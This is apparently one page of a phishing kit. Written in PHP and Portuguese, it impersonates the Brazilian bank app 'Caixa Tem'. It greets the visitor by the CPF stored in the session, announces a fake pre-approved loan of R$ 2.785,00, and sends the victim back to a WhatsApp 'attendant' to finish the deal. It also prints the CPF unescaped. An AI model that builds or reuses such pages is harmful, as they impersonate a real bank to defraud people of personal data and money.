<?php require_once('../../config/config.php'); $cpf = $_SESSION['username']; session_destroy(); ?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caixa Tem - Empréstimo Pré-aprovado</title>
    <link rel="shortcut icon" href="../../assets/img/soon.png" type="image/x-icon">
    <link rel="stylesheet" href="../../assets/css/approved.css">
</head>

<body>
    <div class="centered-image">
        <img src="../../assets/img/final.png" width="200">
    </div>

    <div class="main-text">
        <h1>Empréstimo pré-aprovado com sucesso!</h1>
    </div>

    <div class="additional-info" style="padding: 0px 10px;">
        <p>
            Parabéns <b><?= $cpf ?></b>, você possui <b>R$ 2.785,00</b> liberado na nossa pré-aprovação.
            <br><br>
            Retorne para o atendente, para <b>CONCLUIR</b> o processo de contratação do seu empréstimo.
        </p>
    </div>

    <a href="https://api.whatsapp.com/send" class="btn">VOLTAR PARA O WHATSAPP</a>
</body>

</html>